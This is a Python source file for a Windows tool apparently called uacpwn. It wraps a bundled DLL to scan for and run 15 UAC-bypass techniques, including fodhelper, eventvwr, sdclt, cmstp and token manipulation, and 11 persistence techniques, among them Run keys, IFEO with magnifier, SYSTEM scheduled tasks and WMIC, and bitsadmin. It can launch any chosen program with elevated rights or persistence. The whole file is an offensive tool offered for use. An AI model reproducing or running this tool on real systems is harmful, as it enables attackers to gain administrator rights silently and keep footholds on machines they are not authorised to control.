#!/usr/bin/env python3

"""
UAC Bypass & Persistence Scanner
A professional tool for scanning and executing UAC bypass methods
Author: github.com/Mr-Spect3r
Telegram: @MrEsfelurm
Version: 2.0
"""

import subprocess

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import ctypes, sys, os

try:
    from colorama import Fore, init
except ImportError:
    install("colorama")
    from colorama import Fore, init

try:
    from tabulate import tabulate
except ImportError:
    install("tabulate")
    from tabulate import tabulate

init(autoreset=True)

dll = ctypes.CDLL(os.path.join(os.path.dirname(__file__), "dll/myuac.dll"))

for i in range(1, 16):
    f = getattr(dll, f"uacm{i}")
    f.argtypes, f.restype = [ctypes.c_char_p], ctypes.c_int
for i in range(1, 12):
    f = getattr(dll, f"per{i}")
    f.argtypes, f.restype = [ctypes.c_char_p], ctypes.c_int

dll.scan.argtypes = [
    ctypes.POINTER(ctypes.c_int * 15),  
    ctypes.POINTER(ctypes.c_int),       
    ctypes.POINTER(ctypes.c_int)        
]
dll.scan.restype = ctypes.c_int

dll.scan_persistence.argtypes = [
    ctypes.POINTER(ctypes.c_int * 11),  
    ctypes.POINTER(ctypes.c_int)        
]
dll.scan_persistence.restype = ctypes.c_int
dll.is_elevated.restype = ctypes.c_int

METHODS = {
    1: ("runas", True), 2: ("fodhelper.exe", False), 3: ("slui.exe", False),
    4: ("silentcleanup task", False), 5: ("sdclt.exe (IsolatedCommand)", True),
    6: ("sdclt.exe (App Paths)", True), 7: ("perfmon.exe", True),
    8: ("eventvwr.exe", True), 9: ("compmgmtlauncher.exe", True),
    10: ("computerdefaults.exe", False), 11: ("token manipulation", True),
    12: ("sdclt.exe (Folder)", False), 13: ("cmstp.exe", False),
    14: ("wsreset.exe", False), 15: ("slui.exe + changepk.exe", False),
}
PERSISTENCE = {
    1: ("mofcomp.exe (SYSTEM)", False), 2: ("schtasks.exe SYSTEM", False),
    3: ("IFEO + magnifier.exe", False), 4: ("userinit key", False),
    5: ("HKCU run key", True), 6: ("HKLM run key", False),
    7: ("wmic.exe SYSTEM", False), 8: ("startup files", True),
    9: ("Cortana windows app", True), 10: ("People windows app", True),
    11: ("bitsadmin.exe", False),
}
STATUS_MAP = {0: ("Not Compatible", Fore.RED), 1: ("Likely Compatible", Fore.GREEN), 
              2: ("Conditional", Fore.YELLOW)}

def banner():
    print(f"""{Fore.RED}                                                                          
                            -.            .=                              
                           .@%-.        .-@@.                             
                           -@#-%.      .%@+#:                             
                           +@@.+=      +@%.:*                             
                            -@*@:      :@#@-  
                            .*@@*      *@@#  
                             .@@@:    .@@@.  
                             .#@@*    #@@* 
                              .@@@:...@@@.
                      ..-+#@@@@@@@#=@@@@@@@@@#+-.                        
                  :*%@@@@@@@@@@@@@@.+**#@@@@@@@@@@@%*:                    
             .-#@@@@@@%*-.  ..  *@@+#@@*  ... .-*%@@@@@@%-.               
              %@@@=:.     ..    :@%:@@@:    ..     .:=@@@@.               
              *@@+      ..       *+*@@*       ..      +@@#                
              -@@@.     .        ::@%@:              .%@@-                
              :@@@:              +@@.*-              :@@@.                
               *@@+             .@@*%+-              +%@#.                
               :@@@:            ++..*@-*.           .@@@.                 
               .#@@*    .    .=#%@*..- %@+     .    #@@#                  
                .@@@=    ..-*%::%: :@%%@@@*--..    =@@%.                  
                 -@@@:%@@@@@@@@@@@@%*:%-:+@@:#@@@@+@@@-                   
       ..   .-*#@@@@@@.@@#+-:=-..       .+@@@%:%@@@@@@@@#*-.   ..         
     .+#.=@@@@@@@@%%@@%.#@@@#  ..      .. .%@@@*.-.:*%@@@@@@@@@@@+.       
   .*%+#@@@#+-.   ..+-*@@@#.                .##-@@@+..  ..-+##..-+%*.     
   ....-*%.       ..=@@@@=                    =@@@@= .       .%*-....     
             .....-@@@@@@@#.                .#@@@@@@@-.....               
                :@@@@= .#@@@=             .=@@@#..-@@@%:                  
            .:=%@@@+     -@@@@:.         :@@@@-     +@@@@=:.              
            *-.*@*..      .=@@@%-      -%@@@=.       .**=@@*              
           -*+@@@.          .+@@@@=..-@@@@*           .%:.+@-             
          .%#+:                =@@@%%@@@=.              .:=#%.            
                                .:%%@@:.                                  
                                   .                                      
                                                                          
{Fore.CYAN}
    ╔══════════════════════════════════════╗
    ║     {Fore.GREEN}UAC Bypass & Persistence Tool{Fore.CYAN}    ║
    ║     {Fore.RED}github.com/Mr-Spect3r{Fore.CYAN}            ║
    ╚══════════════════════════════════════╝{Fore.RESET}""")

def scan_uac():
    banner()
    results = (ctypes.c_int * 15)()
    uac = ctypes.c_int()
    build = ctypes.c_int()
    
    dll.scan(ctypes.byref(results), ctypes.byref(uac), ctypes.byref(build))
    
    print(f"\n{Fore.CYAN}System Info:{Fore.RESET}")
    print(f"  UAC Level: {Fore.YELLOW}{uac.value}")
    print(f"  Build: {Fore.YELLOW}{build.value}")
    print(f"  Elevated: {Fore.GREEN if dll.is_elevated() else Fore.RED}{bool(dll.is_elevated())}{Fore.RESET}\n")
    
    table = []
    for i, (desc, _) in enumerate(METHODS.values(), 1):
        status, color = STATUS_MAP.get(results[i-1], ("Unknown", Fore.WHITE))
        table.append([f"{Fore.CYAN}{i}{Fore.RESET}", f"{color}{status}{Fore.RESET}", desc])
    print(tabulate(table, ["ID", "Status", "Method"], tablefmt="grid"))

def scan_per():
    banner()
    results = (ctypes.c_int * 11)()
    elevated = ctypes.c_int()
    
    dll.scan_persistence(ctypes.byref(results), ctypes.byref(elevated))
    
    print(f"\n{Fore.CYAN}Elevated: {Fore.GREEN if elevated.value else Fore.RED}{bool(elevated.value)}{Fore.RESET}\n")
    
    table = []
    for i, (desc, needs) in enumerate(PERSISTENCE.values(), 1):
        status = Fore.GREEN + "VULNERABLE" if results[i-1] == 1 else Fore.RED + "BLOCKED" if results[i-1] == 0 else Fore.WHITE + "UNKNOWN"
        table.append([i, status + Fore.RESET, "Yes" if needs else "No", desc])
    print(tabulate(table, ["ID", "Status", "Admin", "Method"], tablefmt="grid"))
    print(f"\n{Fore.YELLOW}Note: 'No' Admin methods work with standard user rights{Fore.RESET}")

def execute(typ, num, prog):
    if not os.path.exists(prog):
        return print(f"{Fore.RED}[!] File not found: {prog}")
    
    data = METHODS if typ == "uac" else PERSISTENCE
    if not (1 <= num <= len(data)):
        return print(f"{Fore.RED}[!] Invalid method: {num}")
    
    desc, prompt = list(data.values())[num-1]
    print(f"{Fore.CYAN}[*] Executing: {desc} {'(PROMPT)' if prompt else '(SILENT)'}{Fore.RESET}")
    print(f"{Fore.CYAN}[*] Target: {prog}{Fore.RESET}")
    
    func = getattr(dll, f"{'uacm' if typ == 'uac' else 'per'}{num}")
    res = func(prog.encode())
    
    print(f"{Fore.GREEN}[+] Success!" if res == 1 else f"{Fore.RED}[-] Failed" if res == 0 else f"{Fore.RED}[!] Error")

def usage():
    banner()
    print(f"""
{Fore.CYAN}Usage:{Fore.RESET}
  --scan           Scan UAC bypass methods
  --scan-per       Scan persistence methods
  -m <n> <prog>    Execute UAC method n
  -p <n> <prog>    Execute persistence method n

{Fore.CYAN}Examples:{Fore.RESET}
  python uacpwn.py --scan
  python uacpwn.py -m 2 C:\Windows\System32\cmd.exe
  python uacpwn.py -p 5 C:\Windows\System32\cmd.exe""")

def main():
    if len(sys.argv) < 2:
        return usage()
    
    cmd = sys.argv[1]
    if cmd == "--scan": scan_uac()
    elif cmd == "--scan-per": scan_per()
    elif cmd in ("-m", "-p") and len(sys.argv) >= 4:
        execute("uac" if cmd == "-m" else "per", int(sys.argv[2]), sys.argv[3])
    else: usage()

if __name__ == "__main__":

    main()
